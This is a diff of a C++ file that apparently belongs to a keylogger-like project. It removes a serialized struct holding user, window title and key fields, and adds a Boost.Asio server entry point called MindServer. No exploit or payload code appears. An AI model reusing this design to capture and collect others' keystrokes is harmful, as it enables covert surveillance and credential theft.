@@ -19,30 +19,32 @@
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#pragma once
 
-#ifndef SERIALIZATION_STRUCT_H
-#define SERIALIZATION_STRUCT_H
+/* Ugly Windows API code */
 
 #include "common.hpp"
+#include "MindServer.h"
 
-#define SERIALIZE_VERSION 2
-
-struct KeyDataStruct
+int main(int argc, char* argv[])
 {
-    std::string User;
-    std::string WindowTitle;
-    std::string Key;
-
-    template <typename Archive>
-    void serialize(Archive& ar, const unsigned int version)
+    try
     {
-        ar & User;
-        ar & WindowTitle;
-        ar & Key;
+        if (argc != 2)
+        {
+            std::cerr << "Usage: Server <port>, Standar: 1995" << std::endl;
+            return 1;
+        }
+
+        unsigned short port = boost::lexical_cast<unsigned short>(argv[1]);
+
+        boost::asio::io_service io_service;
+        MindServer server(io_service, port);
+        io_service.run();
     }
-};
+    catch (std::exception& e)
+    {
+        std::cerr << e.what() << std::endl;
+    }
 
-BOOST_CLASS_VERSION(KeyDataStruct, SERIALIZE_VERSION)
-
-#endif // SERIALIZATION_STRUCT_H
+    return 0;
+}
